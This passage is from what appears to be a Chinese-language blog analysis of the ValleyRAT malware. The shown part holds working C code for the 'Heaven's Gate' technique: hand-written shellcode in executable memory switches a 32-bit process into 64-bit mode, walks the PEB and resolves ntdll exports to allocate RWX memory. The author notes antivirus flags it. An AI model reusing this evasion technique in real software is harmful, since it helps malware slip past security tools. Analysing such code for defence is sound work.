+    <span class="hljs-type">uint64_t</span> ret = <span class="hljs-number">0</span>;
+    <span class="hljs-type">static</span> <span class="hljs-type">uint8_t</span> code[] = {
+        <span class="hljs-number">0x53</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xF8</span>,
+        <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xCB</span>,
+        <span class="hljs-number">0x56</span>, <span class="hljs-number">0x57</span>,
+        <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xE</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x18</span>,
+        <span class="hljs-number">0x48</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xB</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xEF</span>,
+        <span class="hljs-number">0x48</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xD0</span>,
+        <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x7</span>,
+        <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x5E</span>,
+        <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xCB</span>,
+        <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x5B</span>,
+        <span class="hljs-number">0xC3</span>
+    };
+
+    <span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> ptr = <span class="hljs-literal">NULL</span>;
+    <span class="hljs-keyword">if</span> (!ptr) {
+        ptr = (<span class="hljs-type">uint32_t</span>)VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(code); i++) ((PBYTE)ptr)[i] = code[i];
+    }
+    *(<span class="hljs-type">uint32_t</span>*)(ptr + <span class="hljs-number">9</span>) = ptr + <span class="hljs-number">14</span>;
+    *(<span class="hljs-type">uint64_t</span>*)(ptr + <span class="hljs-number">18</span>) = (<span class="hljs-type">uint64_t</span>)args;
+    *(<span class="hljs-type">uint64_t</span>*)(ptr + <span class="hljs-number">43</span>) = (<span class="hljs-type">uint64_t</span>)argc;
+    *(<span class="hljs-type">uint64_t</span>*)(ptr + <span class="hljs-number">70</span>) = proc;
+    *(<span class="hljs-type">uint64_t</span>*)(ptr + <span class="hljs-number">86</span>) = (<span class="hljs-type">uint64_t</span>)&amp;ret;
+    *(<span class="hljs-type">uint32_t</span>*)(ptr + <span class="hljs-number">102</span>) = ptr + <span class="hljs-number">108</span>;
+    ((<span class="hljs-type">void</span>(*)())ptr)();
+    <span class="hljs-keyword">return</span> ret;
+}
+
+<span class="hljs-type">uint64_t</span> <span class="hljs-title function_">GetModuleHandle64</span><span class="hljs-params">(<span class="hljs-type">const</span> WCHAR* moduleName)</span> {
+    <span class="hljs-type">uint64_t</span> peb64;
+    <span class="hljs-type">uint64_t</span> ldrData;
+    <span class="hljs-type">uint64_t</span> head;
+    <span class="hljs-type">uint64_t</span> pNode;
+    GetPEB64(&amp;peb64);
+    memcpy64((<span class="hljs-type">uint64_t</span>)&amp;ldrData, peb64 + <span class="hljs-number">0x18</span>, <span class="hljs-number">8</span>);
+    head = ldrData + <span class="hljs-number">0x10</span>;
+    memcpy64((<span class="hljs-type">uint64_t</span>)&amp;pNode, head, <span class="hljs-number">8</span>);
+    <span class="hljs-keyword">while</span> (pNode != head) {
+        <span class="hljs-type">uint64_t</span> buffer;
+        memcpy64((<span class="hljs-type">uint64_t</span>)&amp;buffer, pNode + <span class="hljs-number">96</span>, <span class="hljs-number">8</span>);
+        <span class="hljs-keyword">if</span> (buffer) {
+            WCHAR curModuleName[<span class="hljs-number">128</span>] = { <span class="hljs-number">0</span> };
+            memcpy64((<span class="hljs-type">uint64_t</span>)curModuleName, buffer, <span class="hljs-number">250</span>);
+            <span class="hljs-keyword">if</span> (!lstrcmpiW(moduleName, curModuleName)) {
+                <span class="hljs-type">uint64_t</span> base;
+                memcpy64((<span class="hljs-type">uint64_t</span>)&amp;base, pNode + <span class="hljs-number">48</span>, <span class="hljs-number">8</span>);
+                <span class="hljs-keyword">return</span> base;
+            }
+        }
+        memcpy64((<span class="hljs-type">uint64_t</span>)&amp;pNode, pNode, <span class="hljs-number">8</span>);
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
+}
+
+<span class="hljs-type">uint64_t</span> <span class="hljs-title function_">MyGetProcAddress</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> moduleBase, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* funcName)</span> {
+    <span class="hljs-keyword">if</span> (!moduleBase) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+
+    <span class="hljs-type">uint8_t</span> headers[<span class="hljs-number">0x1000</span>];
+    memcpy64((<span class="hljs-type">uint64_t</span>)headers, moduleBase, <span class="hljs-number">0x1000</span>);
+
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)headers;
+    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(headers + dos-&gt;e_lfanew);
+    <span class="hljs-type">uint32_t</span> exportRVA = nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    <span class="hljs-keyword">if</span> (!exportRVA) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+
+    IMAGE_EXPORT_DIRECTORY expDir;
+    memcpy64((<span class="hljs-type">uint64_t</span>)&amp;expDir, moduleBase + exportRVA, <span class="hljs-keyword">sizeof</span>(expDir));
+
+    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>; i &lt; expDir.NumberOfNames; i++) {
+        <span class="hljs-type">uint32_t</span> nameRVA;
+        memcpy64((<span class="hljs-type">uint64_t</span>)&amp;nameRVA, moduleBase + expDir.AddressOfNames + i * <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);
+
+        <span class="hljs-type">char</span> name[<span class="hljs-number">256</span>] = { <span class="hljs-number">0</span> };
+        memcpy64((<span class="hljs-type">uint64_t</span>)name, moduleBase + nameRVA, <span class="hljs-number">255</span>);
+
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(name, funcName) == <span class="hljs-number">0</span>) {
+            <span class="hljs-type">uint16_t</span> ordinal;
+            memcpy64((<span class="hljs-type">uint64_t</span>)&amp;ordinal, moduleBase + expDir.AddressOfNameOrdinals + i * <span class="hljs-number">2</span>, <span class="hljs-number">2</span>);
+
+            <span class="hljs-type">uint32_t</span> funcRVA;
+            memcpy64((<span class="hljs-type">uint64_t</span>)&amp;funcRVA, moduleBase + expDir.AddressOfFunctions + ordinal * <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);
+
+            <span class="hljs-keyword">return</span> moduleBase + funcRVA;
+        }
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+
+<span class="hljs-type">uint64_t</span> <span class="hljs-title function_">GetKernel32</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span> kernel32 = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">if</span> (kernel32) <span class="hljs-keyword">return</span> kernel32;
+    <span class="hljs-type">uint64_t</span> ntdll = GetModuleHandle64(<span class="hljs-string">L"ntdll.dll"</span>);
+    <span class="hljs-keyword">if</span> (!ntdll) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"未能找到ntdll64.dll。\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+    }
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ntdll64.dll地址: 0x%llX\n"</span>, ntdll);
+
+    <span class="hljs-type">uint64_t</span> LdrLoadDll = MyGetProcAddress(ntdll, <span class="hljs-string">"LdrLoadDll"</span>);
+    <span class="hljs-keyword">if</span> (!LdrLoadDll) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"未找到 ntdll!LdrLoadDll\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+    }
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ntdll!LdrLoadDll地址: 0x%llX\n"</span>, LdrLoadDll);
+
+    <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* dllName = <span class="hljs-string">L"kernel32.dll"</span>;
+    UNICODE_STRING64 us;
+    us.Length = wcslen(dllName) * <span class="hljs-number">2</span>;
+    us.MaximumLength = us.Length + <span class="hljs-number">2</span>;
+    us.Buffer = (<span class="hljs-type">uint64_t</span>)dllName;
+    us.Pad = <span class="hljs-number">0</span>;
+
+    <span class="hljs-type">uint64_t</span> status = X64Call(LdrLoadDll, <span class="hljs-number">4</span>, (<span class="hljs-type">uint64_t</span>)<span class="hljs-number">0</span>, (<span class="hljs-type">uint64_t</span>)<span class="hljs-number">0</span>, (<span class="hljs-type">uint64_t</span>)&amp;us, (<span class="hljs-type">uint64_t</span>)(&amp;kernel32));
+
+
+    <span class="hljs-keyword">return</span> kernel32;
+}
+
+<span class="hljs-type">uint64_t</span> <span class="hljs-title function_">GetProcAddress64</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> module, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* func)</span> {
+    <span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span> K32GetProcAddress = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">if</span> (!K32GetProcAddress) {
+        K32GetProcAddress = MyGetProcAddress(GetKernel32(), <span class="hljs-string">"GetProcAddress"</span>);
+    }
+    <span class="hljs-keyword">return</span> X64Call(K32GetProcAddress, <span class="hljs-number">2</span>, module, (<span class="hljs-type">uint64_t</span>)func);
+}
+
+<span class="hljs-type">uint64_t</span> <span class="hljs-title function_">LoadLibrary64</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* name)</span> {
+    <span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span> LoadLibraryA = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">if</span> (!LoadLibraryA) {
+        LoadLibraryA = GetProcAddress64(GetKernel32(), <span class="hljs-string">"LoadLibraryA"</span>);
+    }
+    <span class="hljs-keyword">return</span> X64Call(LoadLibraryA, <span class="hljs-number">1</span>, (<span class="hljs-type">uint64_t</span>)name);
+}
+
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span> {
+
+    <span class="hljs-type">uint64_t</span> ntdll = GetModuleHandle64(<span class="hljs-string">L"ntdll.dll"</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"成功获取 64位 ntdll.dll: 0x%llX\n"</span>, ntdll);
+
+    <span class="hljs-keyword">if</span> (!ntdll) <span class="hljs-keyword">return</span>;
+    <span class="hljs-type">uint64_t</span> NtAllocateVirtualMemory = MyGetProcAddress(ntdll, <span class="hljs-string">"NtAllocateVirtualMemory"</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"NtAllocateVirtualMemory: 0x%llX\n"</span>, NtAllocateVirtualMemory);
+
+    <span class="hljs-keyword">if</span> (NtAllocateVirtualMemory) {
+
+        <span class="hljs-type">uint64_t</span> baseAddress = <span class="hljs-number">0</span>;            
+        <span class="hljs-type">uint64_t</span> regionSize = <span class="hljs-number">0x1000</span>;        
+        <span class="hljs-type">uint64_t</span> currentProcessHandle = <span class="hljs-number">-1</span>;   
+
+        <span class="hljs-comment">// NtAllocateVirtualMemory </span>
+        <span class="hljs-comment">// NTSTATUS NtAllocateVirtualMemory(</span>
+        <span class="hljs-comment">//   HANDLE    ProcessHandle, </span>
+        <span class="hljs-comment">//   PVOID     *BaseAddress,  </span>
+        <span class="hljs-comment">//   ULONG_PTR ZeroBits,      </span>
+        <span class="hljs-comment">//   PSIZE_T   RegionSize,   </span>
+        <span class="hljs-comment">//   ULONG     AllocationType,</span>
+        <span class="hljs-comment">//   ULONG     Protect       </span>
+        <span class="hljs-comment">// );</span>
+
+        <span class="hljs-type">uint64_t</span> status = X64Call(NtAllocateVirtualMemory, <span class="hljs-number">6</span>,
+            currentProcessHandle,
+            (<span class="hljs-type">uint64_t</span>)&amp;baseAddress,
+            (<span class="hljs-type">uint64_t</span>)<span class="hljs-number">0</span>,
+            (<span class="hljs-type">uint64_t</span>)&amp;regionSize,
+            (<span class="hljs-type">uint64_t</span>)(MEM_COMMIT | MEM_RESERVE),
+            (<span class="hljs-type">uint64_t</span>)PAGE_EXECUTE_READWRITE
+        );
+
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"返回状态码 (NTSTATUS): 0x%llX\n"</span>, status);
+
+        <span class="hljs-keyword">if</span> (status == <span class="hljs-number">0</span>) { <span class="hljs-comment">// 0 等于 STATUS_SUCCESS</span>
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"内存地址: 0x%llX\n"</span>, baseAddress);
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"内存大小: 0x%llX (4096 Bytes)\n"</span>, regionSize);
+        }
+        <span class="hljs-keyword">else</span> {
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[-] 分配失败。\n"</span>);
+        }
+    }
+}
+
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+    BOOL isWow64 = FALSE;
+    IsWow64Process(GetCurrentProcess(), &amp;isWow64);
+    <span class="hljs-keyword">if</span> (!isWow64) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"错误\n"</span>);
+        system(<span class="hljs-string">"pause"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre><p><img src="/assets/posts/valleyrat/images/1772707718815-a9d83a1f-089f-484c-b4f3-b40de61d0ba2.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>实现了一个简单的开辟内存空间操作，在win11\10上测试可以正常使用。</p>
+<p>这个代码在拥有360环境下会被查杀，虽然并没有恶意操作</p>
+</div><footer class="article-footer"><div><span>本文链接</span><a href="https://ycr0w.github.io/2026/08/13/valleyrat/">https://ycr0w.github.io/2026/08/13/valleyrat/</a></div></footer></article>
+    <aside class="article-aside"><div class="toc"><span>目录</span><a class="toc-level-3" href="#%E9%92%93%E9%B1%BC%E9%83%A8%E5%88%86">钓鱼部分</a><a class="toc-level-3" href="#createhiddentask.vbs">CreateHiddenTask.vbs</a><a class="toc-level-3" href="#keytool.exe">keytool.exe</a><a class="toc-level-3" href="#jli.dll">jli.dll</a><a class="toc-level-3" href="#shellcode">shellcode</a><a class="toc-level-3" href="#%E5%A4%A9%E5%A0%82%E4%B9%8B%E9%97%A8">天堂之门</a></div></aside>
+    <nav class="post-navigation"><a href="/2026/08/13/storm/"><i data-lucide="arrow-left" aria-hidden="true"></i><span><small>上一篇</small>Storm</span></a><a href="/2026/08/13/winos-4.0/"><span><small>下一篇</small>Winos 4.0</span><i data-lucide="arrow-right" aria-hidden="true"></i></a></nav>
+  </main>
+  <footer class="site-footer"><span>© 2026 YCr0w</span></footer>
+</body>
+</html>
